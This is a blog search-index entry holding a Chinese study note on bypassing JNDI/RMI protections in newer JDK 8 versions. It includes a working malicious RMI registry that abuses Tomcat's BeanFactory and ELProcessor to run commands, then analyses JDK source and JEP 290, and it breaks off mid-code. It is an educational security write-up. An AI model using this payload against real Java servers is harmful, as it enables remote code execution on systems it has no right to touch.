<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>高版本 JDK RMI JNDI Bypass 学习笔记</title>
      <link href="/2020/09/29/gao-ban-ben-jdk-rmi-jndi-bypass-xue-xi-bi-ji/"/>
      <url>/2020/09/29/gao-ban-ben-jdk-rmi-jndi-bypass-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="高版本-JDK-RMI-JNDI-Bypass-学习笔记"><a href="#高版本-JDK-RMI-JNDI-Bypass-学习笔记" class="headerlink" title="高版本 JDK RMI JNDI Bypass 学习笔记"></a>高版本 JDK RMI JNDI Bypass 学习笔记</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>此片文章我们以jdk 1.8为例进行介绍</p><p>众所周知，Oracle在jdk 8u121 版本中添加了 JEP290 以及对<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的校验</p><p> 然后又在以及8u 191这个版本中添加了针对<code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的校验，导致在高版本JDK中 无法通过 反序列化  <code>rmi reference</code>  和<code>ldap Reference</code>来进行RCE攻击</p><p>所以如果目标服务器上使用的是高版本JDK，且存在有JDNI注入等RCE的点，那我们想要利用成功就必须要绕过以上的种种限制</p><h2 id="绕过姿势1"><a href="#绕过姿势1" class="headerlink" title="绕过姿势1"></a>绕过姿势1</h2><p>首先是来自一个国外大佬提供的思路，该姿势的核心思想就是在本地查找可利用的<code>ObjectFactory</code>。</p><p>先粘贴下服务端的代码</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RMIProvider5</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> RemoteException<span class="token punctuation">,</span> AlreadyBoundException<span class="token punctuation">,</span> NamingException <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Creating evil RMI registry on port 1099"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span>      <span class="token comment" spellcheck="true">//这里使用了ResourceRef，ResourceRef是Reference的子类</span>        ResourceRef ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"javax.el.ELProcessor"</span><span class="token punctuation">,</span> null<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"x=eval"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows</span>        <span class="token comment" spellcheck="true">/**这里需要注意，由于jdk版本不同 在jdk 8u20版本进行测试的时候是会报错的，在jdk 8u121及其之后的版本测试是会成功的，主要原因出在NashornScriptEngine这个类上 具体报错是什么原因就不是很想深究了，也没什么深究的意义*/</span>        ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span> <span class="token string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['open','/Applications/Calculator.app']).start()\")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ReferenceWrapper referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"refObj"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>在之前一片文章中有写过JNDI在处理<code>Reference</code>的时候会尝试先从本地加载传递来的<code>classFactory</code>，然后本地加载不到才会在通过<code>URLClassloader</code>去远程加载，但是不管这个类是本地加载的还是远程加载的都要符合一个关键条件就是要实现<code>javax.naming.spi.ObjectFactory</code>这个接口，下面说下原因</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//由于返回值必须是ObjectFactory类型，如果想要程序可以正常返回上一个方法并且可以不报错的继续执行，那我们就需要一个实现了ObjectFactory接口的类</span><span class="token keyword">static</span> ObjectFactory <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>    Reference ref<span class="token punctuation">,</span> String factoryName<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IllegalAccessException<span class="token punctuation">,</span>    InstantiationException<span class="token punctuation">,</span>    MalformedURLException <span class="token punctuation">{</span>    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> clas <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Try to use current class loader</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//这里会将通过Reference传递过来的classfactory先用AppClassloader从本地尝试加载一遍，这里也就是我们绕过高版本JDK限制的点</span>         clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ignore and continue</span>        <span class="token comment" spellcheck="true">// e.printStackTrace();</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// All other exceptions are passed up.</span>    <span class="token comment" spellcheck="true">// Not in class path; try to use codebase</span>    String codebase<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">//这里是低版本通过rmi Reference 或者ldap远程加载恶意类的点，由于在JDK 8u191版本之后对</span>          <span class="token comment" spellcheck="true">//com.sun.jndi.ldap.object.trustURLCodebase</span>          <span class="token comment" spellcheck="true">//com.sun.jndi.rmi.object.trustURLCodebase</span>          <span class="token comment" spellcheck="true">//全部进行了校验所以该点已经基本不可利用了</span>          <span class="token comment" spellcheck="true">//不过在低版本中 这个远程加载的恶意类可以不实现ObjectFactory接口</span>          <span class="token comment" spellcheck="true">//因为恶意代码是写在了静态代码块中，只要类加载到了本地，静态代码块就会执行，</span>          <span class="token comment" spellcheck="true">//不过就是如果恶意类没有实现ObjectFactory接口，后续会抛出异常罢了，因为返回值类型不对么。</span>            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>现在我们清楚这个绕过姿势的核心思想，同样使用的是Reference对象，但是从之前的直接远程加载恶意类到本地变成了先从本地加载一个实现了<code>ObjectFactory</code>接口的类，这样就导致的一个问题，就是这种利用方式高度依赖于目标站点所依赖的jar包。</p><p>我们可以看下<code>ObjectFactory</code>接口中都定义了哪些方法</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">ObjectFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>                                    Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span>        <span class="token keyword">throws</span> Exception<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>根据源码可以看到<code>ObjectFactory</code>内只定义了一个<code>getObjectInstance</code>方法</p><p>这个方法很关键，为什么这样说我们返回到调用<code>getObjectFactoryFromReference</code>方法的地方去</p><pre class=" language-java"><code class="language-java">factory <span class="token operator">=</span> <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//ref这个参数可控</span>    <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span>                                     environment<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以看到程序会调用<code>ObjectFactory.getObjectInstance()</code>方法，也就是说我们只需要找到一个实现了<code>ObjectFactory</code>的类，且该类在<code>getObjectInstance</code>方法中对外部传入的参数进行也高危操作。</p><p>顺着这个思路，就找到了这么一个类<code>org.apache.naming.factory.BeanFactory</code>该类存在于tomcat-catalina.jar包中，我们来看看这个<code>BeanFactory</code>中的<code>getObjectInstance</code>方法的部分实现</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> Object <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>                                Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span>    <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//将传入的object参数强转为Reference对象</span>            Reference ref <span class="token operator">=</span> <span class="token punctuation">(</span>Reference<span class="token punctuation">)</span> obj<span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">//获取reference对像中的classname属性</span>            String beanClassName <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> beanClass <span class="token operator">=</span> null<span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//获取当前上下文的Classloader，也就是AppClassLoader</span>            ClassLoader tcl <span class="token operator">=</span>                 Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getContextClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>tcl <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                  <span class="token comment" spellcheck="true">//通过AppClassLoader加载reference对像中的classname属性中所存储的类对象</span>                    beanClass <span class="token operator">=</span> tcl<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>ClassNotFoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    beanClass <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>ClassNotFoundException e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>beanClass <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>                    <span class="token punctuation">(</span><span class="token string">"Class not found: "</span> <span class="token operator">+</span> beanClassName<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            BeanInfo bi <span class="token operator">=</span> Introspector<span class="token punctuation">.</span><span class="token function">getBeanInfo</span><span class="token punctuation">(</span>beanClass<span class="token punctuation">)</span><span class="token punctuation">;</span>            PropertyDescriptor<span class="token punctuation">[</span><span class="token punctuation">]</span> pda <span class="token operator">=</span> bi<span class="token punctuation">.</span><span class="token function">getPropertyDescriptors</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//实例化该对象</span>            Object bean <span class="token operator">=</span> beanClass<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/* Look for properties with explicitly configured setter */</span>                      <span class="token comment" spellcheck="true">//获取ResourceRef.addr[]中addrType为forceString的addr</span>                RefAddr ra <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Method<span class="token operator">></span> forced <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Method<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                String value<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>ra <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token comment" spellcheck="true">//获取addrType为forceString的addr的contents，这里contes的值为</span>                  <span class="token comment" spellcheck="true">//"x=eval"</span>                    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> paramTypes<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    paramTypes<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>                    String setterName<span class="token punctuation">;</span>                    <span class="token keyword">int</span> index<span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/* Items are given as comma separated list */</span>                  <span class="token comment" spellcheck="true">//将“x=eval”这段字符串进行分割</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span>String param<span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">/* A single item can either be of the form name=method                         * or just a property name (and we will use a standard                         * setter) */</span>                          <span class="token comment" spellcheck="true">//获取 = 号前面的部分，也就是“x”</span>                        index <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                          <span class="token comment" spellcheck="true">//获取 = 号后面的内容 也就是“eval”</span>                            setterName <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            param <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                            setterName <span class="token operator">=</span> <span class="token string">"set"</span> <span class="token operator">+</span>                                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span>Locale<span class="token punctuation">.</span>ENGLISH<span class="token punctuation">)</span> <span class="token operator">+</span>                                         param<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                          <span class="token comment" spellcheck="true">//将“x”作为key 通过反射的形式</span>                          <span class="token comment" spellcheck="true">//ElProcessor.class.getMethod("eval",new Class[1])</span>                          <span class="token comment" spellcheck="true">//获取eval方法对象并作为value一同存入forced这个HashMap中</span>                            forced<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>param<span class="token punctuation">,</span>                                       beanClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>setterName<span class="token punctuation">,</span> paramTypes<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchMethodException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>                                <span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> setterName <span class="token operator">+</span>                                 <span class="token string">" not found for property "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SecurityException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span>                                <span class="token punctuation">(</span><span class="token string">"Forced String setter "</span> <span class="token operator">+</span> setterName <span class="token operator">+</span>                                 <span class="token string">" not allowed for property "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                Enumeration<span class="token operator">&lt;</span>RefAddr<span class="token operator">></span> e <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    ra <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    String propName <span class="token operator">=</span> ra<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">//循环找到“x”所对应的addr </span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>Constants<span class="token punctuation">.</span>FACTORY<span class="token punctuation">)</span> <span class="token operator">||</span>                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"scope"</span><span class="token punctuation">)</span> <span class="token operator">||</span> propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"auth"</span><span class="token punctuation">)</span> <span class="token operator">||</span>                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">)</span> <span class="token operator">||</span>                        propName<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"singleton"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token keyword">continue</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                    <span class="token comment" spellcheck="true">//获取其中的contents 也就是payload</span>                    value <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>ra<span class="token punctuation">.</span><span class="token function">getContent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    Object<span class="token punctuation">[</span><span class="token punctuation">]</span> valueArray <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">/* Shortcut for properties with explicitly configured setter */</span>                  <span class="token comment" spellcheck="true">//从forced这个hashmap中取出key为x的一项</span>                    Method method <span class="token operator">=</span> forced<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>propName<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>method <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        valueArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>                        <span class="token keyword">try</span> <span class="token punctuation">{</span>                          <span class="token comment" spellcheck="true">//通过反射的方式调用ElProcessor.eval方法并将payload作为参数传入</span>                            method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>bean<span class="token punctuation">,</span> valueArray<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>可以看到该部分的代码是将我们在<code>Reference</code>中指定的<code>className</code>通过反射的形式给实例化出来了，并解析传递来的<code>Reference</code>对象，最终通过反射的形式调用了ElProcessor.eval方法将payload作为参数传入然后执行。</p><p>这就是通过加载本地ObjectFactory的方式进行RMI Reference攻击，以上案例中使用到了以下几个类</p><p><code>org.apache.naming.factory.BeanFactory</code>   该类依赖于tomcat-catalina.jar</p><p><code>javax.el.ELProcessor</code>   和该类依赖于tomcat-embed-el.jar  尝试过使用javax.el-api.jar 和el-ri.jar但是会报各种错误</p><p>也就是说只有在目标目标服务器上存在上述jar包时，案例中的方法才能够利用成功，所以该方法非常局限。</p><h2 id="绕过姿势2"><a href="#绕过姿势2" class="headerlink" title="绕过姿势2"></a>绕过姿势2</h2><p>众所周知，在Oracle 在JDK 高版本中添加了一项针对java反序列化漏洞的机制 JEP 290，影响范围由以下三个版本及其及后的所有版本，</p><ul><li>Java™ SE Development Kit 8, Update 121 (JDK 8u121)</li><li>Java™ SE Development Kit 7, Update 131 (JDK 7u131)</li><li>Java™ SE Development Kit 6, Update 141 (JDK 6u141)</li></ul><p>这里简单介绍下JEP 290</p><p>JEP 290主要提供了以下几种机制</p><p>1 提供一个限制反序列化类的机制，白名单或者黑名单 </p><p>2 限制反序列化的深度和复杂度 </p><p>3 为RMI远程调用对象提供了一个验证类的机制 </p><p>4 定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器 </p><p>通俗点说就是我们可以通过自定义白名单或者黑名单的方式来对传递过来的反序列化数据进行校验，同时可以自定义一次反序列化行为的次数和深度</p><p>在JDK 8u121 版本之前 我们可以通过 ysoserial中的<code>RMIRegistryExploit</code>搭配指定的gadget来攻击 <code>Registry</code>该攻击方式本质上就是利用了RMI server在调用 bind方法向<code>Registry</code>注册远程对象方法时传递的是一个Proxy对象，该对象为Proxy搭配上RemoteObjectInvocationHandler，反序列化时只会判断是否是Proxy对象并不会判断该Proxy对象里面用的是什么InvocationHandler，所以我们可以使用经典的搭配Proxy加上AnnotationInvocationHandler再配上指定的gadget就可以轻松RCE。</p><p>但是在JDK 8u121版本之后添加了JEP 290 本质上就是提供了一个<code>ObjectInputFilter</code>该接口是一个函数式接口只有一个抽象方法<code>checkInput</code>方法</p><p>![1](高版本 JDK RMI JNDI Bypass 学习笔记/1.png)</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//该方法在调用时需要传递一个实现了FilterInfo接口的对象进去</span>ObjectInputFilter<span class="token punctuation">.</span>Status <span class="token function">checkInput</span><span class="token punctuation">(</span>ObjectInputFilter<span class="token punctuation">.</span>FilterInfo var1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//下面是FilterInfo接口的相关细节</span>    <span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">FilterInfo</span> <span class="token punctuation">{</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">serialClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> <span class="token function">arrayLength</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> <span class="token function">depth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> <span class="token function">references</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">long</span> <span class="token function">streamBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>同时在JDK 8u121版本之后的RMI服务中  <code>Registry</code>在实例化的过程中就 就自定义了一份校验规则在反序列化服务端传递来的Proxy对象时进行校验。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> Status <span class="token function">registryFilter</span><span class="token punctuation">(</span>FilterInfo var0<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>registryFilter <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Status var1 <span class="token operator">=</span> registryFilter<span class="token punctuation">.</span><span class="token function">checkInput</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">!=</span> Status<span class="token punctuation">.</span>UNDECIDED<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> var1<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//判断反序列化深度 不能超过20</span>    <span class="token keyword">if</span> 